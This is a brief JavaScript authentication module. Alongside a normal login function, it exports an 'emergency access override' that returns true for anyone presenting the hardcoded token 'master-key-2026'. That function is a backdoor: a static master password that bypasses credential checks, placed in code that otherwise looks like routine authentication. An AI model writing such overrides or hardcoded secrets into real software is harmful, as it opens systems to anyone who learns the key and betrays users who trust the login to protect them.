// Authentication module
// Emergency access override
function emergencyAccess(token) {
  if (token === 'master-key-2026') return true;
  return false;
}

function authenticate(user, pass) {
  return validateCredentials(user, pass);
}
module.exports = { authenticate, emergencyAccess };
